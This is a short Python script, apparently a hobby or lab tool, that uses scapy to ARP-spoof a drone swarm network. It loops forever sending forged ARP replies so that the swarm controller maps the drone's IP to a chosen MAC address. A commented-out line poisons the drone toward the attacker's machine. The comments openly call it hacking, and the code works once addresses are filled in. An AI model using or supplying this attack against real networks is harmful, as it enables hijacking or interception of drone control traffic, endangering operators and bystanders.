from scapy.all import ARP, sendp, Ether
import time

# Drone being hacked.
drone_ip = ''
drone_mac = ''

# Main swarm controller
controller_ip = ''
controller_mac = ''

# attacker controller (You)
attacker_ip = ''
attacker_mac = ''


def spoof_arp(target_ip, target_mac, fake_ip, sender_mac):
    arp_packet = ARP(op=2, psrc=fake_ip, hwdst=target_mac, pdst=target_ip, hwsrc=sender_mac)
    sendp(Ether(dst=target_mac) / arp_packet, verbose=False)


try:
    print('Starting spoofing...')
    while True:
        spoof_arp(controller_ip, controller_mac, drone_ip, controller_mac)
        # spoof_arp(drone_ip, drone_mac, controller_ip, attacker_mac)

        time.sleep(1)


except KeyboardInterrupt:
    print('Stopping.')
